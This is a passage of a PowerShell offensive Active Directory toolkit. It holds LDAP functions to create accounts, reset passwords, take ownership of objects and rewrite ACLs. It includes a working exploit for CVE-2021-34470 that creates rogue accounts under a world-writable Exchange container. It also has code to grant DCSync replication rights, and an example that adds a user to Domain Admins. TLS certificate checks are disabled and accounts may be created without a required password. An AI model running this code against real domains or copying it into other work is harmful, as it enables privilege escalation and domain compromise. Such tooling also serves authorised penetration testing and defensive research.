Function New-UserAccount {
<#
.SYNOPSIS
    Create a new user account in Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-UserAccount creates a user object under the default container of a given Active Directory domain.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> New-UserAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testadmin' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
        }
        catch {
            Write-Error "Domain controller unreachable"
            continue
        }

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $defaultNC = $rootDSE.defaultNamingContext[0]
        $containerDN = "CN=Users,$defaultNC"
        $distinguishedName = "CN=$SamAccountName,$containerDN"
        if ($SSL) {
            $uac = '512' # NORMAL_ACCOUNT
        }
        else {
            $uac = '544' # NORMAL_ACCOUNT + PASSWD_NOTREQD
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class 'User' -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] User created: $newObject"
    }
}

Function New-ComputerAccount {
<#
.SYNOPSIS
    Create a new computer account in Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-ComputerAccount creates a computer object under the default container of a given Active Directory domain.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> New-ComputerAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testadmin' -SamAccountName 'testcomputer$' -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
        }
        catch {
            Write-Error "Domain controller unreachable"
            continue
        }

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $defaultNC = $rootDSE.defaultNamingContext[0]
        $containerDN = "CN=Computers,$defaultNC"
        $objectRDN = "CN=$SamAccountName".TrimEnd('$')
        $distinguishedName = "$objectRDN,$containerDN"
        $domain = $defaultNC -replace 'DC=' -replace ',','.'
        $dnsHostName = "$SamAccountName.$domain"
        $spn = @("HOST/$dnsHostName","RestrictedKrbHost/$dnsHostName","HOST/$SamAccountName","RestrictedKrbHost/$SamAccountName")
        if ($SSL) {
            $uac = '4096' # WORKSTATION_TRUST_ACCOUNT
        }
        else {
            $uac = '4128' # WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes; dnsHostName=$dnsHostName; ServicePrincipalName=$spn}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class 'Computer' -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] Computer created: $newObject"
    }
}

Function New-RogueAccount {
<#
.SYNOPSIS
    Create a new account (user or computer) in Active Directory by exploiting CVE-2021-34470.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-RogueAccount creates a msExchStorageGroup object under the current computer account, and creates a further user or computer object under it.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the computer account to use.

.PARAMETER Class
    Specifies the account class to create, defaults to 'user'.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> PsExec.exe -i -s powershell.exe
    PS C:\> New-RogueAccount -Class computer -SamAccountName 'testmachine$' -Password P@ssw0rd

.EXAMPLE
    PS C:\> New-RogueAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testmachine$' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [string]
        $Server = (Get-WMIObject Win32_ComputerSystem | Select -ExpandProperty Domain),

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('user', 'computer')]
        [String]
        $Class = 'user',

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        $currentId = (Get-LdapCurrentUser -Server $Server -SSL:$SSL -Credential $Credential).UserName
        $computer = Get-LdapObject -Server $Server -SSL:$SSL -Credential $Credential -Filter "(sAMAccountName=$currentId)" -Properties 'DistinguishedName'

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $sd = [DirectoryServices.ActiveDirectorySecurity]::new()
        $sd.SetSecurityDescriptorSddlForm("D:P(A;CI;GA;;;WD)", "Access")
        $ba = $sd.GetSecurityDescriptorBinaryForm()
        $containerClass = 'msExchStorageGroup'
        $containerRDN = "CN=$(-join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_}))"
        $distinguishedName = "$containerRDN,$($computer.DistinguishedName)"
        $properties = @{nTSecurityDescriptor=$ba}
        $newContainer = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $containerClass -Properties $properties -Credential $Credential
        Write-Host "[+] Container created: $newContainer"

        $objectRDN = "CN=$SamAccountName".TrimEnd('$')
        $distinguishedName = "$objectRDN,$newContainer"
        switch ($Class) {
            user {
                if ($SSL) {
                    $uac = '512' # NORMAL_ACCOUNT
                }
                else {
                    $uac = '544' # NORMAL_ACCOUNT + PASSWD_NOTREQD
                }
            }
            computer {
                if ($SSL) {
                    $uac = '4096' # WORKSTATION_TRUST_ACCOUNT
                }
                else {
                    $uac = '4128' # WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD
                }
            }
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $Class -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] $Class created: $newObject"
    }
}

Function Set-UserPassword {	
<#
.SYNOPSIS
    Change the password of a given Active Directory account.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-UserPassword renews the password of an Active Directory account, using its current password (expired or not).

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to change password.

.PARAMETER CurrentPassword
    Specifies the current password of the account.

.PARAMETER NewPassword
    Specifies the new password to set.

.PARAMETER Reset
    Enables password reset.

.PARAMETER Credential
    Specifies the privileged account to use for password reset.

.PARAMETER SSL
    Use SSL connection to LDAP server for password reset.

.EXAMPLE
    PS C:\> Set-UserPassword -Server DC.ADATUM.CORP -SamAccountName testuser -CurrentPassword P@ssw0rd -NewPassword Str0ngP@ssw0rd

.EXAMPLE
    PS C:\> Set-UserPassword -Server DC.ADATUM.CORP -SamAccountName testuser -NewPassword Str0ngP@ssw0rd -Reset -Credential ADATUM\testadmin
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [ValidateNotNullOrEmpty()]
        [String]
        $SamAccountName,

        [String]
        $CurrentPassword,

        [String]
        $NewPassword,

        [Switch]
        $Reset,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $SSL
    )

    $DllImport = @'
[DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
public static extern bool NetUserChangePassword(string domain, string username, string currentPassword, string newpassword);
'@
    $NetApi32 = Add-Type -MemberDefinition $DllImport -Name NetApi32 -Namespace Win32 -PassThru

    if ((-not $Reset) -and (-not $PSBoundParameters.ContainsKey('CurrentPassword'))) {
        $currentPasswordSecure = Read-Host "Current password" -AsSecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($currentPasswordSecure)
        $CurrentPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    }
    if (-not $PSBoundParameters.ContainsKey('NewPassword')) {
        $newPasswordSecure = Read-Host "New password" -AsSecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($newPasswordSecure)
        $NewPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    }

    if (-not $Reset) {
        if ($NetApi32::NetUserChangePassword($Server, $SamAccountName, $CurrentPassword, $NewPassword)) {
            Write-Error "Password change failed for $SamAccountName." -ErrorAction Stop
        }
    }
    else {
        $object = Get-LdapObject -Server $Server -SSL:$SSL -Filter "(sAMAccountName=$SamAccountName)" -Properties 'distinguishedName' -Credential $Credential
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')
        $properties = @{unicodePwd=$passwordBytes}
        Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $object.distinguishedName -Properties $properties -Operation Replace -Credential $Credential -ErrorAction Stop
    }
    Write-Host "[*] Password change succeeded for $SamAccountName"
}

Function Set-LdapObject {
<#
.SYNOPSIS
    Modify properties for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObject adds or replaces specified properties for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object.

.PARAMETER Properties
    Specifies the properties of the object to modify.

.PARAMETER Operation
    Specifies wether the specified properties must be added or replaced, defaults to 'Add'.

.EXAMPLE
    PS C:\> Set-LdapObject -Server DC.ADATUM.CORP -DistinguishedName "CN=Domain Admins,CN=Users,DC=ADATUM,DC=CORP" -Properties @{member="CN=testuser,CN=Users,DC=ADATUM,DC=CORP"} -Operation Add
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateSet('Add', 'Replace')]
        [String]
        $Operation = 'Add',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    if ($SSL) {
        try {
            # Get default naming context
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'

            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            switch ($Operation) {
                'Add'       { $operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Add }
                'Replace'   { $operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace }
                #'Delete'    { $operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete }
            }
            foreach ($property in $Properties.GetEnumerator()) {
                $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
                $modification.Name = $property.Key
                $modification.Operation = $operation
                $modification.Add($property.Value) | Out-Null
                $request.Modifications.Add($modification) | Out-Null
            }
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw
            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            foreach ($property in $Properties.GetEnumerator()) {
                # unicodePwd can not be set in cleartext
                if ($property.Key -eq 'unicodePwd') {
                    $passwordBytes = $property.Value
                }
                else {
                    switch ($Operation) {
                        'Add' { 
                            $values = @()
                            $values += $entry.$($property.Key)
                            $values += $property.Value
                            $entry.Put($property.Key, $values)
                        }
                        'Replace' {
                            $entry.Put($property.Key, $property.Value)
                        }
                    }
                }
            }
            if ($passwordBytes) {
                Write-Verbose "Attempting to set password..."
                $password = [Text.Encoding]::Unicode.GetString($passwordBytes).TrimStart('"').TrimEnd('"')
                $entry.Invoke("SetPassword", $password)
            }
            $entry.CommitChanges()
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Set-LdapObjectOwner {
<#
.SYNOPSIS
    Modify the owner for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObjectAcl modifies the owner for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object for which the security descriptor is modified.

.PARAMETER OwnerSID
    Specifies the Security Identifier (SID) of the new owner.

.EXAMPLE
    PS C:\> $sid = (New-Object Security.Principal.SecurityIdentifier (Get-LdapObject -Server DC.ADATUM.CORP -Filter "(sAMAccountName=testuser)" -Properties objectSid).objectSid,0).Value
    PS C:\> Set-LdapObjectOwner -Server DC.ADATUM.CORP -DistinguishedName "CN=testadmin,CN=Users,DC=ADATUM,DC=CORP" -OwnerSID $sid
    PS C:\> (New-Object -TypeName Security.AccessControl.RawSecurityDescriptor (Get-LdapObject -Server DC.ADATUM.CORP -Filter "(sAMAccountName=testadmin)" -Properties ntsecurityDescriptor).ntsecurityDescriptor,0).Owner
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Security.Principal.SecurityIdentifier]
        $OwnerSID,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # Get default naming context
    $rootDSE = Get-LdapRootDSE -Server $Server
    $defaultNC = $rootDSE.defaultNamingContext[0]

    if ($SSL) {
        try {
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties 'ntSecurityDescriptor' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $ads = New-Object -TypeName DirectoryServices.ActiveDirectorySecurity
            $ads.SetSecurityDescriptorBinaryForm($object.Attributes.ntsecuritydescriptor[0])
            $ads.SetOwner($OwnerSID)
            $securityDescriptor = $ads.GetSecurityDescriptorBinaryForm()  
            $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
            $modification.Name = 'ntSecurityDescriptor'
            $modification.Operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $modification.Add($securityDescriptor) | Out-Null
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Modifications.Add($modification) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.PermissiveModifyControl
            $control.IsCritical = $false
            $request.Controls.Add($control) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $null, $false, $true)
            $request.Controls.Add($control) | Out-Null
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            $entry.PsBase.Options.SecurityMasks = 'Owner'
            $entry.PsBase.ObjectSecurity.SetOwner($OwnerSID)
            $entry.PsBase.CommitChanges()
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Set-LdapObjectAcl {
<#
.SYNOPSIS
    Modify ACL for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObjectAcl adds or removes ACL for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object for which the security descriptor is modified.

.PARAMETER PrincipalSID
    Specifies the Security Identifier (SID) of the account benefiting from the rights.

.PARAMETER Rights
    Specifies the rights of the object to add or remove, default to all extended rights.

.PARAMETER Operation
    Specifies wether the specified properties must be added or replaced, defaults to 'Add'.

.EXAMPLE
    PS C:\> $sid = (New-Object Security.Principal.SecurityIdentifier (Get-LdapObject -Server DC.ADATUM.CORP -Filter "(sAMAccountName=testuser)" -Properties objectSid).objectSid,0).Value
    PS C:\> Set-LdapObjectAcl -Server DC.ADATUM.CORP -DistinguishedName "DC=ADATUM,DC=CORP" -PrincipalSID $sid -Rights "DCSync" -Operation Add
    PS C:\> Get-LdapObjectAcl -Server DC.ADATUM.CORP -Filter "(dinstinguishedName=DC=ADATUM,DC=CORP)" | Where-Object {$_.SecurityIdentifier -eq $sid}
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Security.Principal.SecurityIdentifier]
        $PrincipalSID,

        [ValidateSet('GenericAll', 'GenericWrite', 'AllExtended', 'DCSync', 'ResetPassword', 'WriteMembers')]
        [String]
        $Rights = 'AllExtended',

        [ValidateSet('Add', 'Remove')]
        [String]
        $Operation = 'Add',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $principal = [Security.Principal.IdentityReference] $PrincipalSID
    $inheritanceType = [DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
    $controlType = [Security.AccessControl.AccessControlType] 'Allow'

    $GUIDs = switch ($Rights) {
        'GenericAll'    { 'GenericAll' }
        'GenericWrite'  { 'GenericWrite' }
        'AllExtended'   { '00000000-0000-0000-0000-000000000000' }
        'DCSync'        { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c' }
        'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
        'WriteMembers'  { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
    }
    $ACEs = @()
    if ($GUIDs -eq 'GenericAll') {
        $ADRights = [DirectoryServices.ActiveDirectoryRights] 'GenericAll'
        $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $inheritanceType
    }
    elseif ($GUIDs -eq 'GenericWrite') {
        $ADRights = [DirectoryServices.ActiveDirectoryRights] 'GenericWrite'
        $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $inheritanceType
    }
    else {
        foreach ($guid in $GUIDs) {
            $newGUID = New-Object -TypeName Guid $guid
            $ADRights = [DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
            $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $newGUID, $inheritanceType
        }
    }

    # Get default naming context
    $rootDSE = Get-LdapRootDSE -Server $Server
    $defaultNC = $rootDSE.defaultNamingContext[0]

    if ($SSL) {
        try {
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties 'ntSecurityDescriptor' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $ads = New-Object -TypeName DirectoryServices.ActiveDirectorySecurity
            $ads.SetSecurityDescriptorBinaryForm($object.Attributes.ntsecuritydescriptor[0])
            foreach ($ace in $ACEs) {
                switch ($Operation) {
                    'Add'       { $ads.AddAccessRule($ace) }
                    'Remove'    { $ads.RemoveAccessRuleSpecific($ace) }
                }
            }
            $securityDescriptor = $ads.GetSecurityDescriptorBinaryForm()  
            $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
            $modification.Name = 'ntSecurityDescriptor'
            $modification.Operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $modification.Add($securityDescriptor) | Out-Null
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Modifications.Add($modification) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.PermissiveModifyControl
            $control.IsCritical = $false
            $request.Controls.Add($control) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $null, $false, $true)
            $request.Controls.Add($control) | Out-Null
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            foreach ($ace in $ACEs) {
                $entry.PsBase.Options.SecurityMasks = 'Dacl'
                switch ($Operation) {
                    'Add' { 
                        $entry.PsBase.ObjectSecurity.AddAccessRule($ace)
                    }
                    'Remove' {
                        $entry.PsBase.ObjectSecurity.RemoveAccessRule($ace) | Out-Null
                    }
                }
                $entry.PsBase.CommitChanges()
            }
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Local:Get-LdapCurrentUser {
    Param (
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        if ($SSL) {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $searcher.SessionOptions.SecureSocketLayer = $true
            $searcher.SessionOptions.VerifyServerCertificate = {$true}
        }
        else {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
        }
        if ($Credential.UserName) {
            $searcher.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object -TypeName DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = [Text.Encoding]::ASCII.GetString($searcher.SendRequest($extRequest).ResponseValue)
        [pscustomobject] @{
            "NetbiosName"   = $($resp.split('\')[0].split(':')[-1])
            "UserName"      = $($resp.split('\')[1])
        }
    }
    catch {
        Write-Error $_
    }
}

Function Local:Get-LdapRootDSE {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL
    )

    $searchString = "LDAP://$Server/RootDSE"
    if ($SSL) {
        # Note that the server certificate has to be trusted
        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
    }
    else {
        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
    }
    $rootDSE = New-Object -TypeName DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
    return $rootDSE
}

Function Local:Get-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,
    
        [Switch]
        $Raw
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            # Get default naming context
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
    }

    Process {
        try {
            if ($SSL) {
                $results = @()
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
